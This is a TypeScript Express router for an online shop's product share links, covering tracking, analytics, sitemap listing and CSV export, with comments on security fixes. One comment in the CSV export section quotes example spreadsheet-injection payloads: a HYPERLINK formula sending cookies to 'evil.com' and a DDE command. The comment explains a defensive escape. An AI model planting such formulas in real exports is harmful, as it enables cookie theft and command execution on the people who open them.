// ============================================================================
//  Smart Share routes
//  ----------------------------------------------------------------------------
//  Public (no auth):
//    GET  /api/share/by-product/:productId
//         → returns existing ShareLink for a product, creating it on demand.
//         Response: { shortId, url, shareUrl, deepLinkUrl, qrUrl, product }
//
//    POST /api/share/track
//         Body: { shortId, eventType, platform?, referrer? }
//         Records a ShareEvent and increments the corresponding counter on
//         ShareLink. Idempotent for `share` events within 10s per (ip,shortId)
//         to prevent counter inflation from double-clicks.
//
//    GET  /api/share/s/:shortId
//         Returns public product data for a share page (without auth).
//         Includes: product, top reviews, related products, share stats.
//         Increments opensCount (deduplicated per IP per 60s).
//
//  Admin-only:
//    GET  /api/share/analytics
//         Returns top-shared products + per-platform breakdown.
// ============================================================================

import { Router } from 'express'
import { z } from 'zod'
import { LRUCache } from 'lru-cache'
import { createHash } from 'node:crypto'
import { prisma } from '../lib/prisma.js'
import { optionalAuth, requireAuth, requireAdmin, type AuthedRequest } from '../lib/auth.js'
import { asyncHandler } from '../lib/asyncHandler.js'
import { generateShortId, isValidShortId } from '../lib/shortid.js'
import { safeParseJsonArray } from '../lib/serialisers.js'
import { resolvePublicUrl, buildShareUrl, buildDeepLinkUrl } from '../lib/public-url.js'
import rateLimit from 'express-rate-limit'
import { auditLog } from '../lib/audit.js'
import { logger } from '../lib/logger.js'

const router = Router()

// NOTE: APP_PUBLIC_URL is no longer hardcoded here — it's resolved per-request
// via resolvePublicUrl(req). This fixes the critical bug where share links
// always pointed at "https://999.pro" (a domain we don't control) instead of
// the actual deployment URL (sandbox preview, customer's domain, etc.).
//
// Override the resolution by setting APP_PUBLIC_URL env var in production.

// ----------------------------------------------------------------------------
//  Rate limiters
//  B-CRIT-002 fix: added openLimiter on GET /api/share/s/:shortId.
//  Previously only trackLimiter existed (on POST /track). The GET route
//  wrote to DB on every call (shareLink.update + shareEvent.create inside
//  $transaction) — attackers could DoS the DB writer queue.
// ----------------------------------------------------------------------------
const trackLimiter = rateLimit({
  windowMs: 60 * 1000,
  limit: 60,
  standardHeaders: 'draft-7',
  legacyHeaders: false,
  message: { error: 'Too many tracking events' },
})

// B-CRIT-002: 30 opens/min/IP is plenty for legit share-page renders
// (one per page load, dedup'd 60s per IP+shortId anyway).
const openLimiter = rateLimit({
  windowMs: 60 * 1000,
  limit: 30,
  standardHeaders: 'draft-7',
  legacyHeaders: false,
  message: { error: 'Too many share page requests' },
})

// P-CRIT-004 fix: public list endpoint for sitemap. 5/min/IP is enough
// for crawlers (Google bot crawls sitemap every few minutes).
const listLimiter = rateLimit({
  windowMs: 60 * 1000,
  limit: 5,
  standardHeaders: 'draft-7',
  legacyHeaders: false,
  message: { error: 'Too many list requests' },
})

// Track dedup for `share` events: 1 per (ip, shortId, platform) per 10s.
// Without this, a double-click on the Share button creates 2 events.
// B-HIGH-003: bounded LRU cache (was: unbounded Map + manual maybeTrim).
const SHARE_DEDUP_TTL = 10_000
const SHARE_DEDUP = new LRUCache<string, number>({ max: 100_000, ttl: SHARE_DEDUP_TTL })

// Open dedup for `open` events: 1 per (ip, shortId) per 60s.
// Prevents the same visitor inflating opensCount by reloading.
// B-HIGH-003: bounded LRU cache (was: unbounded Map + manual maybeTrim).
const OPEN_DEDUP_TTL = 60_000
const OPEN_DEDUP = new LRUCache<string, number>({ max: 100_000, ttl: OPEN_DEDUP_TTL })

// NOTE: lru-cache handles TTL-based eviction automatically — the previous
// maybeTrim() helper (which iterated the whole Map every 5 min) is no longer
// needed and has been removed.

// ----------------------------------------------------------------------------
//  Helpers
// ----------------------------------------------------------------------------

/**
 * Get client IP.
 *
 * v9-audit-fix (S-CRIT-NEW-2): previously parsed `X-Forwarded-For` directly,
 * bypassing Express's `trust proxy` setting. An attacker could spoof XFF to
 * (1) inflate ShareLink.opensCount by defeating the IP-based dedup, and
 * (2) inflate Product.views the same way. When TRUST_PROXY=true, this also
 * made rate limiters bypassable. Use `req.ip` which respects `trust proxy`.
 */
function getClientIp(req: AuthedRequest): string {
  return req.ip || req.socket?.remoteAddress || 'unknown'
}

/**
 * P-HIGH-004 fix: GDPR-compliant IP hashing.
 * Under GDPR (Article 6 + Recital 30), IP addresses are personal data.
 * We hash IPs with a daily-rotated salt before storing in ShareEvent.ip.
 * This:
 *   - Prevents reverse-engineering the original IP from stored data
 *   - Still allows dedup (same IP → same hash within the same day)
 *   - Allows abuse detection (rate limiting uses raw IP in memory, not stored)
 *   - Daily rotation prevents long-term tracking across days
 *
 * The salt is regenerated at midnight UTC. Old hashes become unverifiable,
 * which is the intended privacy property.
 */
const DAILY_SALT_CACHE = { date: '', salt: '' }

// v9-audit-fix: fail-strict pepper validation. In production, refuse to use
// the default pepper. The default is ONLY for dev/test — in prod, a publicly
// known pepper defeats the entire purpose of IP hashing (GDPR compliance).
const INSECURE_DEFAULT_PEPPER = '999pro-default-pepper-change-in-prod'
function getPepper(): string {
  const pepper = process.env.IP_HASH_PEPPER
  if (!pepper || pepper === INSECURE_DEFAULT_PEPPER) {
    if (process.env.NODE_ENV === 'production') {
      throw new Error('[SECURITY] IP_HASH_PEPPER env var must be set to a secure value in production. Refusing to use default pepper.')
    }
    // Dev mode: warn but allow (so the feature works locally)
    if (!pepper && !((global as any)._pepperWarned)) {
      ;(global as any)._pepperWarned = true
      logger.warn('IP_HASH_PEPPER not set — using insecure default. Set this in production!', { module: 'security' })
    }
    return INSECURE_DEFAULT_PEPPER
  }
  return pepper
}

function getDailySalt(): string {
  const today = new Date().toISOString().slice(0, 10)  // YYYY-MM-DD
  if (DAILY_SALT_CACHE.date !== today) {
    // Generate a fresh salt for today. Uses process.env.IP_HASH_PEPPER as a
    // long-term pepper (so an attacker with DB access can't brute-force even
    // if they know the daily salt — they'd also need the pepper from .env).
    DAILY_SALT_CACHE.date = today
    DAILY_SALT_CACHE.salt = `${getPepper()}:${today}`
  }
  return DAILY_SALT_CACHE.salt
}

function hashIpForStorage(ip: string): string {
  // v13.1 (audit P2-8 fix): truncate to 32 hex chars (128 bits) instead of
  // 16 (64 bits). 64 bits has a birthday bound of 2^32 — feasible to brute
  // force on a single GPU to recover the original IP. 128 bits raises the
  // brute-force cost to 2^64, infeasible for any adversary. Still not a
  // full SHA-256 (256 bits) but adequate for dedup + abuse detection
  // while keeping the column compact and indexed.
  return createHash('sha256').update(getDailySalt() + ip).digest('hex').slice(0, 32)
}

/** Truncate user-agent for storage — keep it bounded to avoid DB bloat. */
function truncateUA(ua: string | undefined): string | null {
  if (!ua) return null
  return ua.length > 256 ? ua.slice(0, 256) : ua
}

/** Find or create a ShareLink for the given product. */
async function findOrCreateShareLink(productId: string): Promise<{ id: string; shortId: string } | null> {
  // First, try to find an existing link (fast path).
  const existing = await prisma.shareLink.findUnique({
    where: { productId },
    select: { id: true, shortId: true },
  })
  if (existing) return existing

  // Verify the product actually exists before creating a link for it.
  const product = await prisma.product.findUnique({
    where: { id: productId },
    select: { id: true, deletedAt: true },
  })
  if (!product || product.deletedAt) return null

  // Generate a unique shortId. We retry on collision (extremely unlikely
  // with 8 chars base62, but possible). 5 attempts max.
  for (let attempt = 0; attempt < 5; attempt++) {
    const shortId = generateShortId(8)
    try {
      const link = await prisma.shareLink.create({
        data: { shortId, productId },
        select: { id: true, shortId: true },
      })
      return link
    } catch (e: any) {
      // P2002 = unique constraint violation.
      // P-CRIT-003 fix: the collision could be on `shortId` OR `productId`.
      // The original code only retried with a new shortId, which fails
      // again if the collision was on `productId` (race condition: another
      // concurrent request created the link first). Re-query by productId
      // first — if found, return it (the other request won the race).
      if (e?.code !== 'P2002') throw e
      const raceLink = await prisma.shareLink.findUnique({
        where: { productId },
        select: { id: true, shortId: true },
      })
      if (raceLink) return raceLink
      // Otherwise: shortId genuinely collided, loop continues.
    }
  }
  // All retries exhausted — shouldn't happen, but fall back to a longer ID.
  const shortId = generateShortId(12)
  try {
    const link = await prisma.shareLink.create({
      data: { shortId, productId },
      select: { id: true, shortId: true },
    })
    return link
  } catch (e: any) {
    // P-CRIT-003 final guard: re-check productId one more time.
    if (e?.code === 'P2002') {
      const raceLink = await prisma.shareLink.findUnique({
        where: { productId },
        select: { id: true, shortId: true },
      })
      if (raceLink) return raceLink
    }
    throw e
  }
}

// ----------------------------------------------------------------------------
//  Routes
// ----------------------------------------------------------------------------

/**
 * GET /api/share/by-product/:productId
 *
 * Returns the ShareLink for a product. Creates one on first request.
 * Public — no auth required (so the share button works for anonymous users).
 *
 * Response:
 *   {
 *     shortId, shareUrl, deepLinkUrl, qrPayload,
 *     stats: { shares, opens, appOpens, installs, orders }
 *   }
 */
router.get(
  '/by-product/:productId',
  asyncHandler(async (req, res) => {
    const productId = req.params.productId
    if (!productId || productId.length > 64) {
      return res.status(400).json({ error: 'Invalid product id' })
    }

    const link = await findOrCreateShareLink(productId)
    if (!link) {
      return res.status(404).json({ error: 'Product not found' })
    }

    // Build share / deep link URLs using the request's actual host. This
    // fixes the bug where share links always pointed at "https://999.pro"
    // (a domain we don't control). Now links use the actual deployment URL:
    //   • In production with APP_PUBLIC_URL=https://999pro.ru → that domain
    //   • In sandbox preview → https://preview-*.space-z.ai
    //   • In local dev → http://localhost:3000
    const shareUrl = buildShareUrl(link.shortId, req)
    const deepLinkUrl = buildDeepLinkUrl(link.shortId, req)
    // QR payload uses the deep link URL — on iOS/Android this triggers
    // Universal Links / App Links if the app is installed.
    const qrPayload = deepLinkUrl

    // Fetch counters (cheap — single row).
    const full = await prisma.shareLink.findUnique({
      where: { id: link.id },
      select: {
        sharesCount: true,
        opensCount: true,
        appOpensCount: true,
        installsCount: true,
        ordersCount: true,
      },
    })

    res.json({
      shortId: link.shortId,
      shareUrl,
      deepLinkUrl,
      qrPayload,
      stats: full || {
        shares: 0,
        opens: 0,
        appOpens: 0,
        installs: 0,
        orders: 0,
      },
    })
  }),
)

/**
 * POST /api/share/track
 *
 * Records a share / open / install / order event.
 * Public (optional auth) — anonymous users can also share.
 *
 * Body:
 *   { shortId: string, eventType: 'share'|'open'|'app_open'|'install'|'order',
 *     platform?: string, referrer?: string }
 *
 * The endpoint is idempotent for `share` events (1 per IP+shortId+platform
 * per 10s) and for `open` events (1 per IP+shortId per 60s).
 */
const trackSchema = z.object({
  shortId: z.string().min(4).max(32),
  eventType: z.enum(['share', 'open', 'app_open', 'install', 'order']),
  platform: z.string().max(32).optional().default('unknown'),
  referrer: z.string().max(512).optional(),
  // Wave 6d: ref attribution — track which share platform drove this open/install
  ref: z.enum(['whatsapp', 'telegram', 'instagram', 'facebook', 'vk', 'messenger', 'x', 'email', 'qr', 'qrcode', 'copy', 'web_share', 'web', 'direct', 'in_app', 'in-app', 'unknown']).optional(),
  // Wave 6d: UTM parameters for ad campaign attribution
  utmSource: z.string().max(64).optional(),
  utmMedium: z.string().max(64).optional(),
  utmCampaign: z.string().max(128).optional(),
})

router.post(
  '/track',
  trackLimiter,
  optionalAuth,
  asyncHandler(async (req: AuthedRequest, res) => {
    const parsed = trackSchema.safeParse(req.body)
    if (!parsed.success) {
      return res.status(400).json({ error: 'Invalid payload', details: parsed.error.issues })
    }
    const { shortId, eventType, platform, referrer } = parsed.data

    if (!isValidShortId(shortId)) {
      return res.status(400).json({ error: 'Invalid shortId' })
    }

    const link = await prisma.shareLink.findUnique({
      where: { shortId },
      select: { id: true, productId: true },
    })
    if (!link) {
      return res.status(404).json({ error: 'Share link not found' })
    }

    const ip = getClientIp(req)
    const userAgent = truncateUA(req.headers['user-agent'])

    // Dedup check for share events. (B-HIGH-003: LRU auto-evicts — no manual trim.)
    if (eventType === 'share') {
      const dedupKey = `${ip}|${shortId}|${platform}`
      const last = SHARE_DEDUP.get(dedupKey) || 0
      if (Date.now() - last < SHARE_DEDUP_TTL) {
        return res.json({ ok: true, deduplicated: true })
      }
      SHARE_DEDUP.set(dedupKey, Date.now())
    }

    // Dedup check for open events.
    if (eventType === 'open') {
      const dedupKey = `${ip}|${shortId}`
      const last = OPEN_DEDUP.get(dedupKey) || 0
      if (Date.now() - last < OPEN_DEDUP_TTL) {
        return res.json({ ok: true, deduplicated: true })
      }
      OPEN_DEDUP.set(dedupKey, Date.now())
    }

    // Insert event + update counter in a single transaction.
    // SQLite doesn't support atomic increments inside INSERT, so we use
    // a transaction with serializable isolation (Prisma's default for SQLite).
    try {
      // P-HIGH-004: hash IP before storing (GDPR compliance). Raw IP is used
      // for in-memory dedup (above) but never persisted in plain text.
      const hashedIp = hashIpForStorage(ip)
      await prisma.$transaction([
        prisma.shareEvent.create({
          data: {
            shareLinkId: link.id,
            productId: link.productId,
            platform,
            eventType,
            userId: req.user?.id || null,
            ip: hashedIp,
            userAgent,
            referrer: referrer || null,
            // Wave 6d: ref + UTM attribution
            ref: parsed.data.ref || null,
            utmSource: parsed.data.utmSource || null,
            utmMedium: parsed.data.utmMedium || null,
            utmCampaign: parsed.data.utmCampaign || null,
          },
        }),
        // Increment the appropriate counter on the ShareLink row.
        prisma.shareLink.update({
          where: { id: link.id },
          data: counterUpdate(eventType),
        }),
      ])
    } catch (e) {
      logger.error('Failed to record track event:', { module: 'share', error: e })
      return res.status(500).json({ error: 'Failed to record event' })
    }

    res.json({ ok: true })
  }),
)

function counterUpdate(eventType: string) {
  switch (eventType) {
    case 'share':
      return { sharesCount: { increment: 1 } }
    case 'open':
      return { opensCount: { increment: 1 } }
    case 'app_open':
      return { appOpensCount: { increment: 1 } }
    case 'install':
      return { installsCount: { increment: 1 } }
    case 'order':
      return { ordersCount: { increment: 1 } }
    default:
      return {}
  }
}

/**
 * GET /api/share/s/:shortId
 *
 * Public endpoint that returns the product data for a share page.
 * Used by the Next.js /p/[shortId] route (server-side render) to populate
 * OG tags and the page body.
 *
 * Also increments opensCount (deduplicated per IP per 60s).
 *
 * Response:
 *   {
 *     product: { id, title, description, price, oldPrice, currency, category,
 *                images: string[], rating, reviewsCount, inStock, isPopular,
 *                isAction, isNew, isRecommended },
 *     reviews: Review[],
 *     related: Product[],
 *     stats: { shares, opens, appOpens, installs, orders },
 *     shortId, shareUrl, deepLinkUrl
 *   }
 */
router.get(
  '/s/:shortId',
  openLimiter, // B-CRIT-002: rate-limit the GET endpoint that writes to DB
  asyncHandler(async (req, res) => {
    const { shortId } = req.params
    if (!isValidShortId(shortId)) {
      return res.status(400).json({ error: 'Invalid shortId' })
    }

    const link = await prisma.shareLink.findUnique({
      where: { shortId },
      include: {
        product: true,
      },
    })
    if (!link || !link.product || link.product.deletedAt) {
      return res.status(404).json({ error: 'Product not found' })
    }

    const product = link.product
    const images = safeParseJsonArray(product.images)

    // QW12 (B-PERF-004): reviews + related queries are independent (both
    // depend only on product.id from above) — run them in parallel instead
    // of serially to halve share-page latency.
    const [reviews, related] = await Promise.all([
      // Fetch top reviews (3 most recent, not hidden).
      prisma.review.findMany({
        where: { productId: product.id, isHidden: false },
        include: {
          user: {
            select: { id: true, username: true, displayName: true, avatar: true },
          },
        },
        orderBy: { createdAt: 'desc' },
        take: 5,
      }),
      // Fetch related products from the same category (excluding current).
      prisma.product.findMany({
        where: {
          category: product.category,
          id: { not: product.id },
          deletedAt: null,
          inStock: true,
        },
        take: 8,
        orderBy: { rating: 'desc' },
      }),
    ])

    // Increment opensCount (with dedup).
    const ip = getClientIp(req as AuthedRequest)
    const dedupKey = `${ip}|${shortId}`
    const last = OPEN_DEDUP.get(dedupKey) || 0
    if (Date.now() - last >= OPEN_DEDUP_TTL) {
      OPEN_DEDUP.set(dedupKey, Date.now())
      // v13.2 (audit P1-13 fix): fire-and-forget the counter increment +
      // event insert so the public share page response isn't blocked by
      // a DB write. Previously the page awaited the transaction — under
      // viral load (10k views/hour), that's 20k writes/hour on the hot
      // path, saturating the DB writer queue. Now we respond immediately
      // and the writes happen in the background. Errors are logged but
      // don't affect the user's page load.
      prisma
        .$transaction([
          prisma.shareLink.update({
            where: { id: link.id },
            data: { opensCount: { increment: 1 } },
          }),
          prisma.shareEvent.create({
            data: {
              shareLinkId: link.id,
              productId: product.id,
              eventType: 'open',
              platform: 'web',
              // P-HIGH-004: hash IP before storing (GDPR compliance)
              ip: hashIpForStorage(ip),
              userAgent: truncateUA(req.headers['user-agent']),
              referrer: (req.headers.referer as string) || null,
            },
          }),
        ])
        .catch((e) => {
          logger.error('Failed to record open event:', { module: 'share', error: e })
        })
    }

    const shareUrl = buildShareUrl(link.shortId, req)
    const deepLinkUrl = buildDeepLinkUrl(link.shortId, req)

    res.json({
      shortId: link.shortId,
      shareUrl,
      deepLinkUrl,
      product: {
        id: product.id,
        title: product.title,
        description: product.description,
        price: product.price,
        oldPrice: product.oldPrice,
        currency: product.currency,
        category: product.category,
        images,
        rating: product.rating,
        reviewsCount: product.reviewsCount,
        inStock: product.inStock,
        isPopular: product.isPopular,
        isAction: product.isAction,
        isNew: product.isNew,
        isRecommended: product.isRecommended,
      },
      reviews: reviews.map((r) => ({
        id: r.id,
        rating: r.rating,
        title: r.title,
        content: r.content,
        photos: safeParseJsonArray(r.photos),
        createdAt: r.createdAt,
        user: r.user
          ? {
              id: r.user.id,
              username: r.user.username,
              displayName: r.user.displayName,
              avatar: r.user.avatar,
            }
          : null,
      })),
      related: related.map((p) => ({
        ...p,
        images: safeParseJsonArray(p.images),
      })),
      stats: {
        shares: link.sharesCount,
        opens: link.opensCount,
        appOpens: link.appOpensCount,
        installs: link.installsCount,
        orders: link.ordersCount,
      },
    })
  }),
)

/**
 * GET /api/share/analytics  (admin-only)
 *
 * Returns aggregated share analytics for the Studio dashboard.
 *
 * Response:
 *   {
 *     totalShares, totalOpens, totalInstalls, totalOrders,
 *     topProducts: [{ productId, title, image, shares, opens, orders }],
 *     byPlatform: [{ platform, shares, opens }],
 *     recentEvents: ShareEvent[]
 *   }
 */
router.get(
  '/analytics',
  requireAuth,
  requireAdmin,
  asyncHandler(async (_req, res) => {
    const [agg, topProducts, byPlatform, recentEvents] = await Promise.all([
      prisma.shareLink.aggregate({
        _sum: {
          sharesCount: true,
          opensCount: true,
          appOpensCount: true,
          installsCount: true,
          ordersCount: true,
        },
      }),
      prisma.shareLink.findMany({
        orderBy: { sharesCount: 'desc' },
        take: 20,
        include: {
          product: {
            select: { id: true, title: true, images: true, price: true, currency: true },
          },
        },
      }),
      prisma.shareEvent.groupBy({
        by: ['platform'],
        _count: { _all: true },
        where: { eventType: 'share' },
        orderBy: { _count: { platform: 'desc' } },
      }),
      prisma.shareEvent.findMany({
        orderBy: { createdAt: 'desc' },
        take: 30,
        include: {
          product: { select: { id: true, title: true } },
        },
      }),
    ])

    res.json({
      totals: {
        shares: agg._sum.sharesCount || 0,
        opens: agg._sum.opensCount || 0,
        appOpens: agg._sum.appOpensCount || 0,
        installs: agg._sum.installsCount || 0,
        orders: agg._sum.ordersCount || 0,
      },
      topProducts: topProducts.map((l) => ({
        productId: l.productId,
        shortId: l.shortId,
        title: l.product?.title || '(deleted)',
        image: l.product ? safeParseJsonArray(l.product.images)[0] : null,
        price: l.product?.price || 0,
        currency: l.product?.currency || 'RUB',
        shares: l.sharesCount,
        opens: l.opensCount,
        appOpens: l.appOpensCount,
        installs: l.installsCount,
        orders: l.ordersCount,
      })),
      byPlatform: byPlatform.map((p) => ({
        platform: p.platform,
        shares: p._count._all,
      })),
      recentEvents: recentEvents.map((e) => ({
        id: e.id,
        eventType: e.eventType,
        platform: e.platform,
        createdAt: e.createdAt,
        productTitle: e.product?.title || null,
      })),
    })
  }),
)

/**
 * GET /api/share/list  (public, paginated)
 *
 * P-CRIT-004 fix: Public list endpoint for sitemap generation.
 * Previously the sitemap.ts called /api/share/analytics (admin-only) →
 * 401 → empty array → no share pages ever in sitemap → zero SEO.
 *
 * Returns minimal public fields (shortId + updatedAt) for all share links
 * whose product is not soft-deleted. Cursor-based pagination via ?cursor=
 * (uses shortId lexicographic order — stable).
 *
 * Query params:
 *   cursor: shortId to start AFTER (exclusive). If omitted, start from beginning.
 *   limit:  page size, default 1000, max 5000.
 *
 * Response:
 *   {
 *     items: [{ shortId, updatedAt, productTitle }],
 *     nextCursor: string | null  // null when no more pages
 *   }
 */
router.get(
  '/list',
  listLimiter,
  asyncHandler(async (req, res) => {
    const cursor = typeof req.query.cursor === 'string' ? req.query.cursor : null
    const limitRaw = Number(req.query.limit) || 1000
    const limit = Math.min(Math.max(limitRaw, 10), 5000)

    const links = await prisma.shareLink.findMany({
      where: {
        // Only include if product is not soft-deleted
        product: { deletedAt: null },
        // Cursor pagination: shortId > cursor (lexicographic)
        ...(cursor ? { shortId: { gt: cursor } } : {}),
      },
      select: {
        shortId: true,
        updatedAt: true,
        product: { select: { title: true } },
      },
      orderBy: { shortId: 'asc' },
      take: limit + 1, // +1 to detect if there's a next page
    })

    const hasMore = links.length > limit
    const items = hasMore ? links.slice(0, limit) : links
    const nextCursor = hasMore ? items[items.length - 1].shortId : null

    res.json({
      items: items.map((l) => ({
        shortId: l.shortId,
        updatedAt: l.updatedAt,
        productTitle: l.product?.title || null,
      })),
      nextCursor,
    })
  }),
)

/**
 * GET /api/share/analytics/by-ref  (admin-only)
 *
 * Wave 6d: ref attribution breakdown — which share platforms drive the most opens/installs/orders.
 * Returns: [{ ref, shares, opens, appOpens, installs, orders }]
 */
router.get(
  '/analytics/by-ref',
  requireAuth,
  requireAdmin,
  asyncHandler(async (_req, res) => {
    const byRef = await prisma.shareEvent.groupBy({
      by: ['ref', 'eventType'],
      _count: { _all: true },
      where: { ref: { not: null } },
    })
    // Pivot: rows = ref, columns = eventType
    const pivot: Record<string, Record<string, number>> = {}
    for (const r of byRef) {
      const ref = r.ref || 'unknown'
      if (!pivot[ref]) pivot[ref] = { share: 0, open: 0, app_open: 0, install: 0, order: 0 }
      pivot[ref][r.eventType] = r._count._all
    }
    const result = Object.entries(pivot).map(([ref, counts]) => ({
      ref,
      shares: counts.share || 0,
      opens: counts.open || 0,
      appOpens: counts.app_open || 0,
      installs: counts.install || 0,
      orders: counts.order || 0,
      conversionRate: counts.open > 0 ? ((counts.order || 0) / counts.open * 100).toFixed(2) + '%' : '0%',
    }))
    res.json({ byRef: result })
  }),
)

/**
 * GET /api/share/analytics/by-utm  (admin-only)
 *
 * Wave 6d: UTM campaign breakdown — which ad campaigns drive the most conversions.
 * Returns: [{ utmSource, utmCampaign, shares, opens, orders }]
 */
router.get(
  '/analytics/by-utm',
  requireAuth,
  requireAdmin,
  asyncHandler(async (_req, res) => {
    const byUtm = await prisma.shareEvent.groupBy({
      by: ['utmSource', 'utmCampaign', 'eventType'],
      _count: { _all: true },
      where: { utmSource: { not: null } },
    })
    const pivot: Record<string, Record<string, number>> = {}
    for (const r of byUtm) {
      const key = `${r.utmSource || '?'}|${r.utmCampaign || '?'}`
      if (!pivot[key]) pivot[key] = { share: 0, open: 0, install: 0, order: 0 }
      pivot[key][r.eventType] = r._count._all
    }
    const result = Object.entries(pivot).map(([key, counts]) => {
      const [utmSource, utmCampaign] = key.split('|')
      return {
        utmSource,
        utmCampaign,
        shares: counts.share || 0,
        opens: counts.open || 0,
        installs: counts.install || 0,
        orders: counts.order || 0,
        conversionRate: counts.open > 0 ? ((counts.order || 0) / counts.open * 100).toFixed(2) + '%' : '0%',
      }
    })
    res.json({ byUtm: result })
  }),
)

/**
 * GET /api/share/export  (admin-only)
 *
 * Wave 6e: CSV export of all share events for external analytics.
 * Query params: ?from=2024-01-01&to=2024-12-31&eventType=open
 * Returns: CSV file download.
 */
router.get(
  '/export',
  requireAuth,
  requireAdmin,
  asyncHandler(async (req, res) => {
    const from = req.query.from ? new Date(req.query.from as string) : new Date(Date.now() - 30 * 24 * 60 * 60 * 1000)
    const to = req.query.to ? new Date(req.query.to as string) : new Date()
    const eventType = req.query.eventType as string | undefined

    const events = await prisma.shareEvent.findMany({
      where: {
        createdAt: { gte: from, lte: to },
        ...(eventType ? { eventType } : {}),
      },
      include: {
        product: { select: { title: true } },
        shareLink: { select: { shortId: true } },
      },
      orderBy: { createdAt: 'desc' },
      take: 10000,  // cap at 10k rows for performance
    })

    // Build CSV
    const headers = ['date', 'shortId', 'productTitle', 'eventType', 'platform', 'ref', 'utmSource', 'utmMedium', 'utmCampaign', 'userId', 'ipHash']
    const rows = events.map(e => [
      e.createdAt.toISOString(),
      e.shareLink?.shortId || '',
      e.product?.title || '',
      e.eventType,
      e.platform,
      e.ref || '',
      e.utmSource || '',
      e.utmMedium || '',
      e.utmCampaign || '',
      e.userId || '',
      e.ip || '',
    ])

    // CSV escape:
    // 1. v13.0 (audit P0-5 fix): prepend a single quote to any cell whose
    //    value starts with `=`, `+`, `-`, `@`, tab, or CR. When the admin
    //    opens the CSV in Excel / Google Sheets, these characters are
    //    interpreted as formula starters — attacker-controlled values
    //    (productTitle, referrer, utmCampaign) could execute formulas like
    //    `=HYPERLINK("https://evil.com/exfil?c="&COOKIE())` or
    //    `=cmd|'/c calc'!A1` (DDE command execution on Windows).
    //    A leading single quote forces Excel to treat the cell as text.
    // 2. Wrap fields containing commas/quotes/newlines in double quotes.
    const escapeCsv = (val: unknown) => {
      let s = String(val ?? '')
      if (/^[=+\-@\t\r]/.test(s)) s = "'" + s
      if (s.includes(',') || s.includes('"') || s.includes('\n')) {
        s = `"${s.replace(/"/g, '""')}"`
      }
      return s
    }

    const csv = [
      headers.join(','),
      ...rows.map(r => r.map(escapeCsv).join(',')),
    ].join('\n')

    res.setHeader('Content-Type', 'text/csv; charset=utf-8')
    res.setHeader('Content-Disposition', `attachment; filename="share-events-${from.toISOString().slice(0,10)}-to-${to.toISOString().slice(0,10)}.csv"`)
    res.send(csv)
  }),
)

export default router
